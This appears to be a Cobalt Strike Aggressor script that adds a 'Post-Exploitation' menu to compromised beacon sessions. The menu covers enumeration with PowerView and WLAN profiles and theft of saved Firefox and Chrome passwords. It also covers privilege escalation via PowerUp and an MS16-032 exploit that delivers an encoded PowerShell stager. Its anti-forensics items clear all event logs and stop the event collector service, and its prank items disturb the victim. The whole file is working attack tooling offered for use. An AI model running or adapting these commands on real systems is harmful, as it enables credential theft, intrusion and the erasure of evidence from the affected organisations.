# Adds menu driven support for some post exploit stuff

popup beacon_bottom{
	menu "Post-Exploitation" {
		menu "Enumeration" {
			menu "PowerView"{
				item "List accessible shares"{
					local('$bid');
					foreach $bid ($1){
						binput($1, "powershell-import PowerView.ps1");
						bpowershell_import($1, script_resource("scripts/PowerView.ps1"));
						binput($1, "powershell Invoke-ShareFinder -CheckShareAccess");
						bpowershell($1, "Invoke-ShareFinder -CheckShareAccess");
					}
				}
			}
			item "List WLAN Profiles"{
				local('$bid');
				foreach $bid ($1){
					binput($1, "netsh wlan show profiles");
					bshell($1, "netsh wlan show profiles");
				}
			}
			item "Is User Local Admin?"{
				local('$bid');
				foreach $bid ($1){
					binput($1, "powershell Is-UserLocalAdmin")
					bpowershell($1, "([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] \"Administrator\")")
				}
			}
		}
		menu "Get Credentials"{
			item "Get Firefox Passwords"{
				local('$bid');
				foreach $bid ($1){
					binput($1, "powershell-import Get-FirefoxPasswords.ps1");
					bpowershell_import($1, script_resource("scripts/Get-FirefoxPasswords.ps1"));
					binput($1, "powershell Get-FirefoxPasswords");
					bpowershell($1, "Get-FirefoxPasswords");
				}
			}
			item "Get Chrome Passwords"{
				local('$bid');
				foreach $bid ($1){
					binput($1, "powershell-import Get-ChromePasswords.ps1");
					bpowershell_import($1, script_resource("scripts/Get-ChromePasswords.ps1"));
					binput($1, "powershell Get-ChromePasswords");
					bpowershell($1, "Get-ChromePasswords");
				}
			}
		}
		menu "Privilege Escalation"{
			item "All PowerUp checks"{
				local('$bid');
				foreach $bid ($1){
					binput($1, "powershell-import PowerUp.ps1");
					bpowershell_import($1, script_resource("scripts/PowerUp.ps1"));
					binput($1, "powershell Invoke-AllChecks");
					bpowershell($1, "Invoke-AllChecks");
				}
			}
			item "Invoke MS16-032"{
				local('$bid');
				foreach $bid ($1){
					binput($1, "powershell-import Invoke-MS16-032.ps1");
					bpowershell_import($1, script_resource("scripts/Invoke-MS16-032.ps1"));
					openPayloadHelper(lambda({
						$shellcode = shellcode($bid, false);
						$psenc = powershell_encode_stager($shellcode);
						bstage($bid, $2, $1);
						binput($bid, "powershell Invoke-MS16-032 $1");
						bpowershell($bid, "Invoke-MS16-032 \"powershell.exe -ep bypass -enc $psenc\" ");
					}, $bid => $1));
				}
			}
		}
		menu "Anti-forensics" {
			item "Clear System Event Logs (psh)"{
				local('$bid');
				foreach $bid ($1){
					binput($1, "powershell gcim -CimSession $CimSession -ClassName Win32_NTEventlogFile | icim -MethodName ClearEventLog");
					bpowershell($1, "gcim -CimSession $CimSession -ClassName Win32_NTEventlogFile | icim -MethodName ClearEventLog");
				}
			}
			item "Stop Windows Event Collector svc"{
				local('$bid');
				foreach $bid ($1){
					binput($1, "sc stop wecsvc");
					bshell($1, "sc stop wecsvc");
				}
			}
			item "Check VM" {
				local('$bid');
				foreach $bid ($1){
					binput($1, "powershell-import Check-VM.ps1");
					bpowershell_import($1, script_resource("scripts/Check-VM.ps1"));
					binput($1, "powershell Check-VM");
					bpowershell($1, "Check-VM");
				}
			}
		}
		menu "Annoy" {
			item "Open Hidden Internet Explorer" {
				local('$bid');
				foreach $bid ($1){
					binput($1, "powershell-import Open-HiddenInternetExplorer.ps1");
					bpowershell_import($1, script_resource("scripts/Open-HiddenInternetExplorer.ps1"));
					prompt_text("URL to open?", "https://www.youtube.com/watch?v=wZZ7oFKsKzY", {
						$videoURL = $1;
						return $videoURL;
					});
					binput($1, "powershell Open-HiddenInternetExplorer $videoURL ");
					bpowershell($1, "Open-HiddenInternetExplorer $videoURL ");
				}
			}
			# Credit goes to SadProcessor for these scripts!
			menu "Play chiptunes" {
				item "Play Imperial March" {
					local('$bid');
					foreach $bid ($1){
						binput($1, "powershell-import Play-ImperialMarch.ps1");
						bpowershell_import($1, script_resource("scripts/annoySongs/Play-ImperialMarch.ps1"));
						binput($1, "powershell Play-ImperialMarch");
						bpowershell($1, "Play-ImperialMarch");
					}
				}
				item "Play Rickroll" {
					local('$bid');
					foreach $bid ($1){
						binput($1, "powershell-import Play-RickAstley.ps1");
						bpowershell_import($1, script_resource("scripts/annoySongs/Play-RickAstley.ps1"));
						binput($1, "powershell Play-RickAstely");
						bpowershell($1, "Play-RickAstely");
					}
				}
				item "Play Tetris Theme" {
					local('$bid');
					foreach $bid ($1){
						binput($1, "powershell-import Play-TetrisTune.ps1");
						bpowershell_import($1, script_resource("scripts/annoySongs/Play-TetrisTune.ps1"));
						binput($1, "powershell Play-TetrisTune");
						bpowershell($1, "Play-TetrisTune");
					}
				}
			}
		}
	}
}
